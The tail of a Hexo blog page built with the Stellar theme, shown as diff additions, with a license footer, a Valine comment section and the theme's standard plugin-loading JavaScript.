+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/88.png"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
